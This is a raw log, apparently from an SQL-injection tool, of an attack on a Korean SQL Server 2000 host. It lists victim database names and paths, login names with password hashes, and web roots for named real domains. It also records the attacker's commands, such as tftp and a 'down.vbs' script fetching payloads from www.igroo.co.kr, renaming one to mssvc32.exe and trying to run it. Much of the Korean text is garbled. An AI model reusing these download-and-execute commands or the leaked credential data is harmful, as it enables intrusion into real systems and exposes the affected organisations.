+ ·当前数据库:ywca_db
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+盔夯叼厚	d:\kbuilderdatas\DB_SOURCE\glory_db_Data.MDF	
+aetrex_db	d:\kbuilderdatas\aetrex\glory_db_Data.MDF	
+ansanwoman_db	d:\kbuilderdatas\ansanwoman\glory_db_Data.MDF	
+anycarland_db	d:\kbuilderdatas\anycarland\glory_db_Data.MDF	
+arari_db	d:\kbuilderdatas\arari\glory_db_Data.MDF	
+arirang_db	d:\kbuilderdatas\arirang\glory_db_Data.MDF	
+aroma_db	d:\kbuilderdatas\aroma\glory_db_Data.MDF	
+ato_db	d:\kbuilderdatas\ato\glory_db_Data.MDF	
+attpk_db	d:\kbuilderdatas\attpk\glory_db_Data.MDF	
+beebur_db	d:\kbuilderdatas\beebur\glory_db_Data.MDF	
+beeburEN_db	d:\kbuilderdatas\beeburEN\glory_db_Data.MDF	
+beerline_db	d:\kbuilderdatas\beerline\glory_db_Data.MDF	
+beshine_db	d:\kbuilderdatas\beshine\glory_db_Data.MDF	
+bestdance_db	d:\kbuilderdatas\bestdance\glory_db_Data.MDF	
+bkmetal_db	d:\kbuilderdatas\bkmetal\glory_db_Data.MDF	
+blendjet_db	d:\kbuilderdatas\blendjet\glory_db_Data.MDF	
+blueacademy_db	d:\kbuilderdatas\blueacademy\glory_db_Data.MDF	
+bonspomedi_db	d:\kbuilderdatas\bonspomedi\glory_db_Data.MDF	
+builder	C:\Program Files\Microsoft SQL Server\MSSQL\data\builder.mdf	
+bulhyanggi_db	d:\kbuilderdatas\bulhyanggi\glory_db_Data.MDF	
+bulloman_db	d:\kbuilderdatas\bulloman\glory_db_Data.MDF	
+bureoba_db	d:\kbuilderdatas\bureoba\glory_db_Data.MDF	
+busancarbon_db	d:\kbuilderdatas\busancarbon\glory_db_Data.MDF	
+busanfh_db	d:\kbuilderdatas\busanfh\glory_db_Data.MDF	
+cauwind_db	d:\kbuilderdatas\cauwind\glory_db_Data.MDF	
+ceei_db	d:\kbuilderdatas\ceei\glory_db_Data.MDF	
+chokoosung_db	d:\kbuilderdatas\chokoosung\glory_db_Data.MDF	
+cjywca_db	d:\kbuilderdatas\cjywca\glory_db_Data.MDF	
+cleanday_db	d:\kbuilderdatas\cleanday\glory_db_Data.MDF	
+cleaningtool_db	d:\kbuilderdatas\cleaningtool\glory_db_Data.MDF	
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:ywca_db
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+盔夯叼厚	d:\kbuilderdatas\DB_SOURCE\glory_db_Data.MDF	
+aetrex_db	d:\kbuilderdatas\aetrex\glory_db_Data.MDF	
+ansanwoman_db	d:\kbuilderdatas\ansanwoman\glory_db_Data.MDF	
+anycarland_db	d:\kbuilderdatas\anycarland\glory_db_Data.MDF	
+arari_db	d:\kbuilderdatas\arari\glory_db_Data.MDF	
+arirang_db	d:\kbuilderdatas\arirang\glory_db_Data.MDF	
+aroma_db	d:\kbuilderdatas\aroma\glory_db_Data.MDF	
+ato_db	d:\kbuilderdatas\ato\glory_db_Data.MDF	
+attpk_db	d:\kbuilderdatas\attpk\glory_db_Data.MDF	
+beebur_db	d:\kbuilderdatas\beebur\glory_db_Data.MDF	
+beeburEN_db	d:\kbuilderdatas\beeburEN\glory_db_Data.MDF	
+beerline_db	d:\kbuilderdatas\beerline\glory_db_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM - Data Tools	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+MS SQLEM	sleeping	KBUILDER2	1820	AWAITING COMMAND	kbuilderadmin	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+BUILTIN\Administrators		1	茄惫绢	11 25 2008 12:48PM	11 25 2008 12:48PM	
+dbo		1	茄惫绢	01 11 2010  5:45PM	01 11 2010  5:45PM	
+sa	?癖仰?????脾綛???????袭胏??	1	茄惫绢	08  6 2000  1:27AM	12  4 2008  8:10PM	
+six435	壹胫??纟???廚??????氄?J??畽	111	茄惫绢	03  8 2010  6:08PM	03  8 2010  6:22PM	
+ywca	???嗷???滄?嵜???????壅?芯?	1	茄惫绢	01 13 2010  7:23PM	01 13 2010  7:23PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■dir c:\
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2010-01-31  坷饶 09:01                29 $WINNT.LOG	
+7	2011-01-15  坷傈 01:27    <DIR>          55034501b8aae4c1b52c297fb4cf	
+8	2011-01-14  坷饶 03:00    <DIR>          639a4fd2faf56dce0d786e38	
+9	2010-02-01  坷傈 03:10    <DIR>          AGSPay40	
+10	2011-01-15  坷傈 02:53    <DIR>          Documents and Settings	
+11	2011-04-04  坷饶 08:13               383 down.vbs	
+12	2010-01-31  坷饶 09:52    <DIR>          DRIVER	
+13	2010-02-01  坷傈 01:35    <DIR>          Inetpub	
+14	2011-04-04  坷饶 04:59            13,436 logfile.txt	
+15	2007-02-17  坷饶 11:20            94,720 msizap.exe	
+16	2011-01-18  坷饶 03:41    <DIR>          Program Files	
+17	2011-02-17  坷傈 12:56    <DIR>          serv-u	
+18	2010-02-01  坷傈 04:06    <DIR>          SQL2KSP4	
+19	2011-01-13  坷饶 08:34    <DIR>          Temp	
+20	2011-04-03  坷饶 05:50             1,228 UpdateLog.ini	
+21	2011-04-03  坷饶 05:50               480 UpLog.ini	
+22	2011-02-21  坷饶 04:20    <DIR>          WINNT	
+23	2010-05-27  坷饶 12:05    <DIR>          wmpub	
+24	               6俺 颇老             110,276 官捞飘	
+25	              12俺 叼泛磐府  319,891,656,704 官捞飘 巢澜	
+26		
+■tftp -i www.igroo.co.kr/q.exe c:\liah.exe
+1		
+2	Transfers files to and from a remote computer running the TFTP service.	
+3		
+4	TFTP [-i] host [GET | PUT] source [destination]	
+5		
+6	  -i              Specifies binary image transfer mode (also called	
+7	                  octet). In binary image mode the file is moved	
+8	                  literally, byte by byte. Use this mode when	
+9	                  transferring binary files.	
+10	  host            Specifies the local or remote host.	
+11	  GET             Transfers the file destination on the remote host to	
+12	                  the file source on the local host.	
+13	  PUT             Transfers the file source on the local host to	
+14	                  the file destination on the remote host.	
+15	  source          Specifies the file to transfer.	
+16	  destination     Specifies where to transfer the file.	
+17		
+18		
+■ver
+1		
+2	Microsoft Windows [Version 5.2.3790]	
+3		
+■cscript c:\down.vbs www.igroo.co.kr/q.exe c:\mm.exe
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+■dir c:\mm.exe
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2011-04-04  坷饶 08:46                 0 mm.exe	
+7	               1俺 颇老                   0 官捞飘	
+8	               0俺 叼泛磐府  319,881,269,248 官捞飘 巢澜	
+9		
+■c:\down.vbs www.igroo.co.kr/q.dat c:\mm.dat
+1		
+■dir c:\q.bat
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	颇老阑 茫阑 荐 绝嚼聪促.	
+7		
+■dir c:\mm.bat
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	颇老阑 茫阑 荐 绝嚼聪促.	
+7		
+■cscript c:\down.vbs www.igroo.co.kr/q.dat c:\mm.dat
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+■dir c:\mm.dat
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2011-04-04  坷饶 08:51                 0 mm.dat	
+7	               1俺 颇老                   0 官捞飘	
+8	               0俺 叼泛磐府  319,879,593,984 官捞飘 巢澜	
+9		
+■cscript c:\down.vbs www.igroo.co.kr/qq.dat c:\mssvc.dat
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+■cscript c:\down.vbs http://www.igroo.co.kr/qq.dat c:\mssvc.dat
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+■cscript c:\down.vbs http://www.igroo.co.kr/qq.dat c:\mssvc1.dat
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+■dir c:\mssvc1.dat
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2011-04-04  坷饶 08:56             1,466 mssvc1.dat	
+7	               1俺 颇老               1,466 官捞飘	
+8	               0俺 叼泛磐府  319,878,172,672 官捞飘 巢澜	
+9		
+■dir c:\mssvc.dat
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2011-04-04  坷饶 08:56             1,466 mssvc.dat	
+7	               1俺 颇老               1,466 官捞飘	
+8	               0俺 叼泛磐府  319,878,172,672 官捞飘 巢澜	
+9		
+■copy c:\mssvc.dat c:\mssvc32.exe
+1	        1俺 颇老捞 汗荤登菌嚼聪促.	
+2		
+■dir c:\mssvc32.exe
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 9851-F173	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2011-04-04  坷饶 08:56             1,466 mssvc32.exe	
+7	               1俺 颇老               1,466 官捞飘	
+8	               0俺 叼泛磐府  319,878,168,576 官捞飘 巢澜	
+9		
+■cscript c:\vWeb.vbs
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+5	[ywca.ywca.or.kr]	
+6	ywca.ywca.or.kr	
+7	Path            : D:\builder\USER_DATA\ywca\ywca_event_webzine	
+8		
+9	[kbuilder2]	
+10		
+11	Path            : D:\builder	
+12		
+13	[kuiadmin.sendpage.co.kr]	
+14	kuiadmin.sendpage.co.kr	
+15	Path            : D:\kbuilderadmin	
+16		
+17	[newhrd]	
+18	hrd.sendpage.co.kr	
+19	Path            : D:\imsisites\hrd_new	
+20		
+21	[reseller.sendpage.co.kr]	
+22	reseller.sendpage.co.kr	
+23	Path            : D:\kbuilderadmin\reseller_onmery	
+24		
+25	[think.ywca.or.kr]	
+26	think.ywca.or.kr	
+27	Path            : D:\builder\USER_DATA\ywca\think	
+28		
+■cscript c:\mssvc32.exe
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4	涝仿 坷幅: 颇老 犬厘磊 ".exe"俊 秦寸窍绰 胶农赋飘 浚柳捞 绝嚼聪促.	
+5		
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:ywca_db
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:ywca_db
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+------------------------------------------------------------
+正在获取数据库 [ywca_db] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+取记录数失败，使用设定值：5
+
